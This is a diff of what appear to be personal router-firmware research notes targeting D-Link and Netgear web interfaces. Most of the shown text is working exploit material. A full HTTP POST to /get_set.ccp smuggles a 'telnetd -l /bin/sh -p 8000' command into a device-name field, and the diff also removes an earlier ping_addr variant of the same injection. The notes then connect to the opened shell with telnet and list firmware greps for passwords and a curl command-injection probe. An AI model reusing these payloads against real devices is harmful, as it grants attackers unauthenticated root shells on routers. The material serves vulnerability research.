@@ -43,45 +43,50 @@ Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
 
 - access
 
-<img width="1254" height="514" alt="image" src="https://github.com/user-attachments/assets/cad30559-6dfe-4054-a2fe-bb228c96d0d5" />
+<img width="1888" height="877" alt="image" src="https://github.com/user-attachments/assets/de8a5633-c606-4314-9f9b-1c08b5f02580" />
+
 
 - exploit
+  - save -> intercept 
 ```
-POST /ping.ccp HTTP/1.1
+POST /get_set.ccp HTTP/1.1
 Host: localhost:8080
-Content-Length: 97
+Content-Length: 800
 sec-ch-ua-platform: "Linux"
 Accept-Language: en-US,en;q=0.9
 sec-ch-ua: "Chromium";v="133", "Not(A:Brand";v="99"
 sec-ch-ua-mobile: ?0
 X-Requested-With: XMLHttpRequest
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
-Accept: */*
+Accept: application/xml, text/xml, */*; q=0.01
 Content-Type: application/x-www-form-urlencoded
 Origin: http://localhost:8080
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: http://localhost:8080/tools_vct.asp
+Referer: http://localhost:8080/lan.asp
 Accept-Encoding: gzip, deflate, br
 Cookie: hasLogin=1
 Connection: keep-alive
-
-ccp_act=ping_v4&ping_addr=%0atelnetd+-l+/bin/sh+-p+8000+-b 0.0.0.0%0a&1780120893090=1780120893090
+ccp_act=set&old_ip=192.168.0.1&old_mask=255.255.255.0&new_ip=192.168.0.1&new_mask=255.255.255.0&nextPage=lan.asp&lanHostCfg_IPAddress_1.1.1.0=192.168.0.1&lanHostCfg_SubnetMask_1.1.1.0=255.255.255.0&lanHostCfg_DomainName_1.1.1.0=&lanHostCfg_DNSRelay_1.1.1.0=1&lanHostCfg_DHCPServerEnable_1.1.1.0=1&lanHostCfg_MinAddress_1.1.1.0=192.168.0.100&lanHostCfg_MaxAddress_1.1.1.0=192.168.0.200&lanHostCfg_DHCPLeaseTime_1.1.1.0=1440&lanHostCfg_DeviceName_1.1.1.0=%0atelnetd+-l+/bin/sh+-p+8000+-b 0.0.0.0%0a&lanHostCfg_AlwaysBroadcast_1.1.1.0=0&lanHostCfg_NetBIOSAnnouncement_1.1.1.0=0&lanHostCfg_NetBIOSLearn_1.1.1.0=0&lanHostCfg_NetBIOSScope_1.1.1.0=&lanHostCfg_NetBIOSNodeType_1.1.1.0=2&lanHostCfg_PrimaryWINSAddress_1.1.1.0=0.0.0.0&lanHostCfg_SecondaryWINSAddress_1.1.1.0=0.0.0.0&1782126381414=1782126381414
 ```
-https://kb.netgear.com/000062303/WAC104-Firmware-Version-1-0-4-13
-https://mdr.skyeye.qianxin.com/forum/share/1806
-https://www.itinsight.hu/blog/posts/2015-01-23-mini_httpd-v1-21-information-disclosure.html
 
+- `telnet 192.168.0.1 8000`
+
+- https://kb.netgear.com/000062303/WAC104-Firmware-Version-1-0-4-13
+- https://mdr.skyeye.qianxin.com/forum/share/1806
+- https://www.itinsight.hu/blog/posts/2015-01-23-mini_httpd-v1-21-information-disclosure.html
+
+```
 cat ./etc/defnodes/defaultvalue.xml
 grep -Ri "admin" ./etc/defnodes/
 grep -Ri "password" ./etc/defnodes/
 cat ./etc/services/DEVICE.ACCOUNT.php
 cat ./htdocs/phplib/fatlady/DEVICE.ACCOUNT.php
 cat ./htdocs/phplib/setcfg/DEVICE.ACCOUNT.php
+```
 
-
-https://support.dlink.com.au/Download/download.aspx?product=DIR-600&type=Firmware
-./run.sh -r DIR300 ../firmwere/DIR600B5_FW212WWb02.bin
+- https://support.dlink.com.au/Download/download.aspx?product=DIR-600&type=Firmware
+  - `./run.sh -r DIR300 ../firmwere/DIR600B5_FW212WWb02.bin`
 curl -X POST 192.168.0.1/command.php -d 'cmd=ls'
 ```
